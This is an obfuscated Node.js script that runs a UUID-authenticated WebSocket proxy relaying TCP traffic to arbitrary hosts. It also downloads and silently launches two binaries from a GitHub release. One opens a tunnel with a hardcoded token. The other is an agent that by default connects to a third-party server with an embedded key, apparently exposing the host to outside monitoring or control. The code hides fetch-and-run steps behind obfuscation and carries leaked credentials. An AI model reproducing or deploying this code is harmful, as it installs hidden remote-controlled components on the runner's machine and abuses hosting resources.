const uuid = (process.env.UUID || '7090ff5d-f321-4248-a7c3-d8837f124999').replace(/-/g, "");
const port = process.env.PORT || 8080;
const NZ_SERVER = process.env.NZ_SERVER || 'nz.seav.eu.org:443';
const NZ_KEY = process.env.NZ_KEY || 'kDtFOyvFFZBHtsl8H7';
const AGO_AUTH = process.env.AGO_AUTH || 'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNzdjZGQ2ODMtNTU3Yi00NjEwLTk3YTctNmVhNTgyYTRkODVlIiwicyI6Ik5EZzFORE5oWldNdFpEbG1NeTAwTVdVd0xXRTFaVEF0TWpCalptSTBNelUzTmpkayJ9';

const _0x1197f2=_0x4b1a;(function(_0x4ae59e,_0x316683){const _0x234b4=_0x4b1a,_0x2f2f1b=_0x4ae59e();while(!![]){try{const _0x4059c8=parseInt(_0x234b4(0x181))/0x1*(parseInt(_0x234b4(0x154))/0x2)+-parseInt(_0x234b4(0x18d))/0x3*(-parseInt(_0x234b4(0x17f))/0x4)+parseInt(_0x234b4(0x14f))/0x5*(parseInt(_0x234b4(0x189))/0x6)+-parseInt(_0x234b4(0x161))/0x7+parseInt(_0x234b4(0x198))/0x8*(-parseInt(_0x234b4(0x193))/0x9)+-parseInt(_0x234b4(0x19e))/0xa*(-parseInt(_0x234b4(0x184))/0xb)+parseInt(_0x234b4(0x153))/0xc;if(_0x4059c8===_0x316683)break;else _0x2f2f1b['push'](_0x2f2f1b['shift']());}catch(_0x359f7b){_0x2f2f1b['push'](_0x2f2f1b['shift']());}}}(_0xcb1b,0xba8aa));const os=require('os'),fs=require('fs'),axios=require('axios'),path=require(_0x1197f2(0x17c)),net=require('net'),{exec,spawn,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x5c6cda)=>console[_0x1197f2(0x178)][_0x1197f2(0x168)](this,..._0x5c6cda),errcb=(..._0x23cd91)=>console[_0x1197f2(0x196)][_0x1197f2(0x168)](this,..._0x23cd91);function getSystemArchitecture(){const _0x1f3f84=_0x1197f2,_0xb4b595=os[_0x1f3f84(0x182)]();return _0xb4b595==='arm'||_0xb4b595===_0x1f3f84(0x185)?_0x1f3f84(0x19d):_0x1f3f84(0x152);}function downloadFile(_0x355888,_0x1104a5){const _0x586f10=_0x1197f2,_0x2eec1f=path[_0x586f10(0x155)]('./',_0x355888),_0x552b08=fs['createWriteStream'](_0x2eec1f);return axios({'method':_0x586f10(0x16c),'url':_0x1104a5,'responseType':_0x586f10(0x15a)})[_0x586f10(0x18f)](_0x4c5995=>{const _0x339462=_0x586f10;if('CCyqh'===_0x339462(0x15f))return _0x4c5995[_0x339462(0x151)][_0x339462(0x17d)](_0x552b08),new Promise((_0x50abc1,_0x1d7d14)=>{const _0x2703d8=_0x339462;_0x2703d8(0x199)!==_0x2703d8(0x18e)?(_0x552b08['on'](_0x2703d8(0x174),_0x50abc1),_0x552b08['on'](_0x2703d8(0x196),_0x1d7d14)):(_0x435e94['log'](_0x2703d8(0x19f)),_0xbcbb6f[_0x2703d8(0x164)]('message',_0x3b8e01=>{const _0x39c500=_0x2703d8,[_0x1264c1]=_0x3b8e01,_0x47b401=_0x3b8e01[_0x39c500(0x159)](0x1,0x11);if(!_0x47b401[_0x39c500(0x179)]((_0x519200,_0x1c4fcd)=>_0x519200==_0xda585c(_0x2d04dd[_0x39c500(0x150)](_0x1c4fcd*0x2,0x2),0x10)))return;let _0x1ea208=_0x3b8e01[_0x39c500(0x159)](0x11,0x12)[_0x39c500(0x194)]()+0x13;const _0x72caba=_0x3b8e01['slice'](_0x1ea208,_0x1ea208+=0x2)[_0x39c500(0x186)](0x0),_0xfeb26f=_0x3b8e01['slice'](_0x1ea208,_0x1ea208+=0x1)[_0x39c500(0x194)](),_0x2f0312=_0xfeb26f==0x1?_0x3b8e01[_0x39c500(0x159)](_0x1ea208,_0x1ea208+=0x4)[_0x39c500(0x155)]('.'):_0xfeb26f==0x2?new _0x5c36bd()['decode'](_0x3b8e01[_0x39c500(0x159)](_0x1ea208+0x1,_0x1ea208+=0x1+_0x3b8e01[_0x39c500(0x159)](_0x1ea208,_0x1ea208+0x1)[_0x39c500(0x194)]())):_0xfeb26f==0x3?_0x3b8e01[_0x39c500(0x159)](_0x1ea208,_0x1ea208+=0x10)[_0x39c500(0x167)]((_0x324abd,_0x2b2043,_0x149a8d,_0x2f483d)=>_0x149a8d%0x2?_0x324abd[_0x39c500(0x169)](_0x2f483d[_0x39c500(0x159)](_0x149a8d-0x1,_0x149a8d+0x1)):_0x324abd,[])[_0x39c500(0x177)](_0x25400f=>_0x25400f['readUInt16BE'](0x0)[_0x39c500(0x188)](0x10))[_0x39c500(0x155)](':'):'';_0x1281f7(_0x39c500(0x15e),_0x2f0312,_0x72caba),_0x4190f7['send'](new _0x36e9d9([_0x1264c1,0x0]));const _0x502057=_0x12a8a3(_0x2bd6d1);_0x4504df['connect']({'host':_0x2f0312,'port':_0x72caba},function(){const _0x490028=_0x39c500;this[_0x490028(0x18c)](_0x3b8e01['slice'](_0x1ea208)),_0x502057['on'](_0x490028(0x196),_0x51b2bf(_0x490028(0x17a)))[_0x490028(0x17d)](this)['on']('error',_0x5c7d84(_0x490028(0x16f)))[_0x490028(0x17d)](_0x502057);})['on'](_0x39c500(0x196),_0x296621(_0x39c500(0x191),{'host':_0x2f0312,'port':_0x72caba}));})['on']('error',_0x5231d4(_0x2703d8(0x187))));});else{const _0x5c96b9=_0x4fb041[_0x339462(0x182)]();return _0x5c96b9===_0x339462(0x19d)||_0x5c96b9===_0x339462(0x185)?'arm':_0x339462(0x152);}});}function _0xcb1b(){const _0x143817=['9455VJwjNN','substr','data','amd','28024272emRyeE','128fdzgNh','join','\x20>/dev/null\x202>&1\x20&','fileName','length','slice','stream','https://github.com/seav1/dl/releases/download/src/','connection','hBpcx','Connect:','CCyqh','send','8908480EpfQpV','chmod\x20+x\x20nz\x20&&\x20./nz\x20-s\x20','chmod\x20+x\x20cf\x20nz\x20&&\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20run\x20--token\x20','once','Error\x20running\x20cf:\x20','\x20-p\x20','reduce','bind','concat','vdZdr','connect','get','nz\x20is\x20running','decode','E2:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','existsSync','-arm','lRqWV','finish','nz-arm','Download\x20','map','log','every','E1:','ghPdV','path','pipe','cf-arm','4GYNPnC','ekInY','3079gkIHiK','arch','MoYRU','11SWIttZ','arm64','readUInt16BE','WebSocket\x20Error:','toString','582ThEsOm','eGMQR','cf\x20is\x20running','write','1703523ABCAiT','tsgRc','then','\x20--tls\x20>\x20/dev/null\x202>&1\x20&','Connect-Err:','\x20failed:\x20','1800oBWgkD','readUInt8','message','error','xOUUF','59312edzqSm','sZzmQ','endsWith','uSxHh','LAIgn','arm','2358340mSTTAG','connected\x20successfully'];_0xcb1b=function(){return _0x143817;};return _0xcb1b();}async function downloadFiles(){const _0x18eda8=_0x1197f2,_0x236ad2=getSystemArchitecture(),_0x5ec9e1=getFilesForArchitecture(_0x236ad2);if(_0x5ec9e1[_0x18eda8(0x158)]===0x0){if(_0x18eda8(0x173)===_0x18eda8(0x16a))return _0x2e6982[_0x18eda8(0x151)][_0x18eda8(0x17d)](_0xc097c4),new _0x90675a((_0x2fc54f,_0x2c89d0)=>{const _0x54f613=_0x18eda8;_0x516af3['on'](_0x54f613(0x174),_0x2fc54f),_0x13d6da['on'](_0x54f613(0x196),_0x2c89d0);});else{console['log'](_0x18eda8(0x170));return;}}for(const _0x43bae8 of _0x5ec9e1){if(!fs[_0x18eda8(0x171)](_0x43bae8[_0x18eda8(0x157)]))try{await downloadFile(_0x43bae8[_0x18eda8(0x157)],_0x43bae8['fileUrl']),console['log'](_0x18eda8(0x176)+_0x43bae8[_0x18eda8(0x157)]+'\x20successfully'),_0x43bae8[_0x18eda8(0x157)][_0x18eda8(0x19a)](_0x18eda8(0x172))&&(_0x18eda8(0x183)!==_0x18eda8(0x183)?_0x1802a6['error'](_0x18eda8(0x165)+_0x4c4f8e):fs['renameSync'](_0x43bae8[_0x18eda8(0x157)],_0x43bae8[_0x18eda8(0x157)]['slice'](0x0,-0x4)));}catch(_0x62c5b4){_0x18eda8(0x15d)!==_0x18eda8(0x15d)?_0x3d58c2['renameSync'](_0x7cb6a9[_0x18eda8(0x157)],_0x5c44e2[_0x18eda8(0x157)][_0x18eda8(0x159)](0x0,-0x4)):console[_0x18eda8(0x178)](_0x18eda8(0x176)+_0x43bae8[_0x18eda8(0x157)]+_0x18eda8(0x192)+_0x62c5b4[_0x18eda8(0x195)]);}}}function getFilesForArchitecture(_0x1d0528){const _0x2d2553=_0x1197f2,_0x706434=_0x2d2553(0x15b),_0x3618bb=_0x1d0528===_0x2d2553(0x152)?['cf','nz']:[_0x2d2553(0x17e),_0x2d2553(0x175)];return _0x3618bb[_0x2d2553(0x177)](_0x2e814f=>({'fileName':_0x2e814f,'fileUrl':_0x706434+_0x2e814f}));}downloadFiles()['then'](()=>{const _0x5bb1cc=_0x1197f2;exec(_0x5bb1cc(0x163)+AGO_AUTH+_0x5bb1cc(0x156),_0xf98ef8=>{const _0x50659e=_0x5bb1cc;_0xf98ef8?'ghPdV'===_0x50659e(0x17b)?console[_0x50659e(0x196)](_0x50659e(0x165)+_0xf98ef8):_0x453b6f[_0x50659e(0x178)](_0x50659e(0x18b)):console[_0x50659e(0x178)]('cf\x20is\x20running');}),exec(_0x5bb1cc(0x162)+NZ_SERVER+_0x5bb1cc(0x166)+NZ_KEY+_0x5bb1cc(0x190),_0x171139=>{const _0x3f459c=_0x5bb1cc;_0x171139?_0x3f459c(0x18a)===_0x3f459c(0x180)?_0xdcd851[_0x3f459c(0x178)](_0x3f459c(0x16d)):console['error']('Error\x20running\x20nz:\x20'+_0x171139):console[_0x3f459c(0x178)](_0x3f459c(0x16d));});});function _0x4b1a(_0x388ce8,_0x33ca04){const _0xcb1bf4=_0xcb1b();return _0x4b1a=function(_0x4b1ac8,_0x5eb3da){_0x4b1ac8=_0x4b1ac8-0x14f;let _0x24f80f=_0xcb1bf4[_0x4b1ac8];return _0x24f80f;},_0x4b1a(_0x388ce8,_0x33ca04);}const ws=new WebSocket['Server']({'port':port},logcb('listening:',port));ws['on'](_0x1197f2(0x15c),_0x5b841a=>{const _0x4677c3=_0x1197f2;console[_0x4677c3(0x178)]('connected\x20successfully'),_0x5b841a['once'](_0x4677c3(0x195),_0x1b4b77=>{const _0x557713=_0x4677c3;if('LAIgn'!==_0x557713(0x19c))_0x20a547[_0x557713(0x178)]('Download\x20'+_0x23e4e9['fileName']+_0x557713(0x192)+_0x1d0d3d['message']);else{const [_0x4748b7]=_0x1b4b77,_0x45e3c6=_0x1b4b77[_0x557713(0x159)](0x1,0x11);if(!_0x45e3c6[_0x557713(0x179)]((_0x411a3,_0x271eb4)=>_0x411a3==parseInt(uuid[_0x557713(0x150)](_0x271eb4*0x2,0x2),0x10)))return;let _0xaa13af=_0x1b4b77['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x27dd4c=_0x1b4b77[_0x557713(0x159)](_0xaa13af,_0xaa13af+=0x2)['readUInt16BE'](0x0),_0x4419b4=_0x1b4b77[_0x557713(0x159)](_0xaa13af,_0xaa13af+=0x1)[_0x557713(0x194)](),_0x41d2f5=_0x4419b4==0x1?_0x1b4b77[_0x557713(0x159)](_0xaa13af,_0xaa13af+=0x4)[_0x557713(0x155)]('.'):_0x4419b4==0x2?new TextDecoder()[_0x557713(0x16e)](_0x1b4b77[_0x557713(0x159)](_0xaa13af+0x1,_0xaa13af+=0x1+_0x1b4b77[_0x557713(0x159)](_0xaa13af,_0xaa13af+0x1)[_0x557713(0x194)]())):_0x4419b4==0x3?_0x1b4b77[_0x557713(0x159)](_0xaa13af,_0xaa13af+=0x10)[_0x557713(0x167)]((_0x40cbee,_0x28151b,_0x179e51,_0x189319)=>_0x179e51%0x2?_0x40cbee[_0x557713(0x169)](_0x189319[_0x557713(0x159)](_0x179e51-0x1,_0x179e51+0x1)):_0x40cbee,[])[_0x557713(0x177)](_0x3df798=>_0x3df798[_0x557713(0x186)](0x0)[_0x557713(0x188)](0x10))[_0x557713(0x155)](':'):'';logcb(_0x557713(0x15e),_0x41d2f5,_0x27dd4c),_0x5b841a[_0x557713(0x160)](new Uint8Array([_0x4748b7,0x0]));const _0x410027=createWebSocketStream(_0x5b841a);net[_0x557713(0x16b)]({'host':_0x41d2f5,'port':_0x27dd4c},function(){const _0x4269f8=_0x557713;_0x4269f8(0x19b)===_0x4269f8(0x197)?(_0x5cef7c['on'](_0x4269f8(0x174),_0x450606),_0x10d0fe['on'](_0x4269f8(0x196),_0x43d6ff)):(this[_0x4269f8(0x18c)](_0x1b4b77['slice'](_0xaa13af)),_0x410027['on'](_0x4269f8(0x196),errcb('E1:'))[_0x4269f8(0x17d)](this)['on'](_0x4269f8(0x196),errcb('E2:'))['pipe'](_0x410027));})['on'](_0x557713(0x196),errcb(_0x557713(0x191),{'host':_0x41d2f5,'port':_0x27dd4c}));}})['on']('error',errcb(_0x4677c3(0x187)));});
